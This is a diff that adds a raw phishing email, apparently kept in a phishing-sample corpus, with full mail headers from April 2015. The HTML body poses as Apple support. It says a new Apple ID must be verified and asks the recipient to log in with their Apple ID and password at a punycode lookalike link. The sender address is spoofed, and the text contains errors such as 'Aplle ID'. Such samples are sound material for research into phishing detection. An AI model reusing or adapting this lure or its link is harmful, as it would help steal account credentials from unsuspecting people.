@@ -1,0 +1,86 @@
+Return-Path: <lkarlstedt@lakeheadschools.ca>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id A9422F4159
+	for <jose@login.monkey.org>; Fri, 24 Apr 2015 04:01:19 -0500 (CDT)
+Received: from smtpin12.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay01.b.hostedemail.com (Postfix) with SMTP id 5CA9F34E1B0
+	for <jose@login.monkey.org>; Fri, 24 Apr 2015 09:01:19 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70112337078.12.hot75_b74869138f14
+Authentication-Results: auth.b.hostedemail.com; dmarc=none header.from=lakeheadschools.ca
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 86,7.5,0,c4a1bac310fdd3f3,d41d8cd98f00b204,lkarlstedt@lakeheadschools.ca,:,RULES_HIT:41:72:355:375:379:543:962:967:973:978:983:988:989:1147:1212:1216:1224:1256:1260:1263:1311:1313:1314:1345:1381:1431:1432:1433:1434:1437:1515:1516:1517:1535:1544:1686:1711:1719:1730:1747:1777:1792:2198:2199:2393:2525:2538:2568:2610:2627:2682:2685:2691:2859:2890:2891:2901:2902:2910:2913:2915:2924:2925:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3148:3352:3586:3747:3804:3865:3866:3867:3868:3870:3871:3872:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4250:5007:6261:6669:6688:8603:8957:9025:9388:9688:9908:10004:10049:10346:11026:11658:11857:11896:11914:12043:12295:12438:12956:12958:12965:13139:13163:13229:13894:14037:14196:14250:21080,0,RBL:error,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0
+X-HE-Tag: hot75_b74869138f14
+X-Filterd-Recvd-Size: 5401
+Received: from toroondcmxzomta02-srv.bellnexxia.net (toroondcmxzomta02-srv.bellnexxia.net [67.69.168.81])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Fri, 24 Apr 2015 09:01:18 +0000 (UTC)
+Received: from toroondcocmrk01.srvr.bell.ca ([67.69.240.188])
+          by toroondcmxzomta02-srv.bellnexxia.net
+          (InterMail vM.8.01.05.13 201-2260-151-135-20130320) with ESMTP
+          id <20150424090118.UWBP13859.toroondcmxzomta02-srv.bellnexxia.net@toroondcocmrk01.srvr.bell.ca>
+          for <jose@monkey.org>; Fri, 24 Apr 2015 05:01:18 -0400
+Received: from PC1 ([70.31.25.68])
+	by toroondcocmrk01.srvr.bell.ca with 
+	id Kl1F1q0031U9LJE01l1Fsv; Fri, 24 Apr 2015 05:01:18 -0400
+X-Authority-Analysis: v=2.1 cv=TOvWFTVa c=1 sm=1 tr=0
+ a=MM+xCJJWH6s1pBNlRFrRBw==:117 a=MM+xCJJWH6s1pBNlRFrRBw==:17 a=x_tyKeUEAAAA:8
+ a=snrnkYz0AAAA:8 a=2zJYuC2nAAAA:20 a=v3ZZPjhaAAAA:8 a=1XWaLZrsAAAA:8
+ a=QQy-Zg3mAAAA:8 a=4B91gJo8_RxQaOJC7gkA:9 a=hXrUBC7ajhnP8lJG:21
+ a=AK27frVAgFcKfcqo:21 a=Jay5C4p1wjS399jL:21 a=sajiCcLPIxAA:10
+Message-ID: <036283ba-42118-0afa2091797222@pc1>
+From: "@Store." <lkarlstedt@lakeheadschools.ca>
+To: jose@monkey.org
+Subject: Apple ID.
+Date: Fri, 24 Apr 2015 05:00:16 -0400
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+X-Priority: 3
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 69
+
+
+<div style="background-color:#fff">
+<div dir="ltr">
+<div>
+<div style="width:95%;text-align:right;padding-top:6%;padding-bottom:6%">
+<img src="http://insideevs.com/wp-content/uploads/2015/02/apple-logo.png" style="display:inline-block;min-height:28px;width:24px">
+</div>
+<table border="0" cellpadding="0" cellspacing="0">
+<tr>
+<td width="0"></td><td>
+<table border="0" cellpadding="0" cellspacing="0">
+<tr><td style="padding:0 5% 18px;font:300 14px/18px &#39;Lucida Grande&#39;,Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif;color:#333">Customer,</td></tr>
+<tr><td style="padding:0 5% 18px;font:300 14px/18px &#39;Lucida Grande&#39;,Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif;color:#333">You recently selected <em><a href="" target="_blank"></a></em> as a new Apple ID. To verify that the address belongs to you, click the link below and log in using your Apple ID and password.</td></tr>
+
+<tr><td style="padding:0 5% 18px;font:300 14px/18px &#39;Lucida Grande&#39;,Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif;color:#333"><a href="http://xn--cjqv0g40pi8lpv8a29a.com/it" target="_blank">Check now&gt;</a></td></tr>
+<tr><td style="padding:0 5% 0;font-family:&#39;Lucida Grande&#39;,Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif;font-size:14px;line-height:18px;font-weight:bold;color:#333">Due to the receipt of this email.</td></tr>
+<tr><td style="padding:0 5% 18px;font:300 14px/18px &#39;Lucida Grande&#39;,Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif;color:#333">Apple requires validation whenever an e-mail address is selected as an Apple ID. Your Apple ID can not be used until it has been validated. </td></tr>
+<tr><td style="padding:0 5% 18px;font:300 14px/18px &#39;Lucida Grande&#39;,Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif;color:#333">If you have not made this change or if you believe an unauthorized person tries to access your account, you can reset
+ <html>
+your password on the site
+
+ <a href="http://xn--cjqv0g40pi8lpv8a29a.com/it" target="_blank"> My Apple ID</a>.</td></tr>
+<tr><td style="padding:0 5% 18px;font:300 14px/18px &#39;Lucida Grande&#39;,Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-
+serif;color:#333">cordially,</td></tr>
+<tr><td style="padding:18px 5% 51px;font:300 14px/18px &#39;Lucida Grande&#39;,Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif;color:#333">The Apple support</td></tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+<u></u>
+<div></div>
+<table border="0" cellpadding="0" cellspacing="0" style="width:100%">
+<tr><td><div style="min-height:1px" height="1"></div></td></tr>
+<tr><td style="width:100%"><img src="https://ci3.googleusercontent.com/proxy/BskpQQOswEcEktlcWHTJ1GXqrB9aFVLijUYlXi-wmYLZuNmb9EXeeReH-d3DFfp9dXd7-ZKXAP0d6pmDLqyZut7X3x5SOIxKAHPOuFAkp08FDquIHn0r_kfgoizesg=s0-d-e1-ft#https://statici.icloud.com/emailimages/v4/common/footer_gradient_web.png" style="display:block;width:100%" height="16"></td></tr>
+<tr><td style="padding:0;text-align:center;font:11px/15px Geneva,Verdana,Arial,Helvetica,sans-serif;color:#888"><a href="https://www.google.com/url?q=https%3A%2F%2FAppStoreid.AppStore.com%2Fcgi-bin%2FWebObjects%2FMyAppStoreId.woa%2Fwa%2FchooseYourCountry&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHPxafjixUmggshfL_yc-_kl2erpA" style="color:#08c;text-decoration:none" role="link" target="_blank">AppStore</a> | <a href="" style="color:#08c;text-decoration:none" role="link" target="_blank">Assistance</a> | <a href="https://www.google.com/url?q=https%3A%2F%2Fwww.AppStore.com%2Flegal%2Finternet-services%2Fprivacy%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNE00ZA9DQBe3vpiwcZurakEn_chIQ" style="color:#08c;text-decoration:none" role="link" target="_blank">Privacy Policy</a></td></tr>
+<tr><td style="padding:0;margin-bottom:0;text-align:center;font:11px/15px Geneva,Verdana,Arial,Helvetica,sans-serif;color:#888">Copyright © 2015 Aplle ID
